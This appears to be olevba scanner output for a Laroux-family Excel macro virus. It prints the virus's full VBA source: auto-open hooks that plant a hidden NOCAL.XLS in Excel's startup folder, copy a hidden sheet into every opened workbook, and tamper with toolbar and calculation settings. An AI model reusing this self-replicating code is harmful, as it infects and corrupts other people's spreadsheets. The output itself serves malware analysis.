olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-55d036ffbb380ca37c49677dc5ef028034f9e3c7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux-based-55d036ffbb380ca37c49677dc5ef028034f9e3c7 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Laroux-based-55d036ffbb380ca37c49677dc5ef028034f9e3c7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Laroux-based-55d036ffbb380ca37c49677dc5ef028034f9e3c7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Laroux-based-55d036ffbb380ca37c49677dc5ef028034f9e3c7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO nocal.bas 
in file: Virus.MSExcel.Laroux-based-55d036ffbb380ca37c49677dc5ef028034f9e3c7 - OLE stream: '_VBA_PROJECT_CUR/VBA/nocal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo clearerror
    Toolbars(1).ToolbarButtons(5).OnAction = "Record01"
    Toolbars(1).ToolbarButtons(6).OnAction = "Record02"
    Application.OnSheetActivate = "check_files"
    Exit Sub
clearerror:
Exit Sub
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo clearerror
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "NOCAL.XLS")
    If m$ = "NOCAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("nocal").Visible = True
    Sheets("nocal").Select
    Sheets("nocal").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "NOCAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("nocal").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NOCAL.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "nocal" Then
        Workbooks("NOCAL.XLS").Sheets("nocal").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("nocal").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NOCAL.XLS!check_files"
    Case Else
End Select
clearerror:
Exit Sub
End Sub

Sub Record01()
Attribute Record01.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo clearerror
    ActiveWindow.SelectedSheets.PrintOut Copies:=2
Exit Sub
clearerror:
Exit Sub
End Sub

Sub Record02()
Attribute Record02.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo clearerror
    With Application
        .Calculation = xlManual
        .MaxChange = 0.001
        .CalculateBeforeSave = False
    End With
    ActiveWorkbook.PrecisionAsDisplayed = False
    Application.DisplayStatusBar = False
    ActiveSheet.PrintPreview
Exit Sub
clearerror:
Exit Sub
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"

On Error GoTo clearerror
Application.DisplayStatusBar = True
    With Application
        .Calculation = xlAutomatic
        .MaxChange = 0.001
    End With
    ActiveWorkbook.PrecisionAsDisplayed = False
    Exit Sub
clearerror:
Exit Sub
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  noca
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

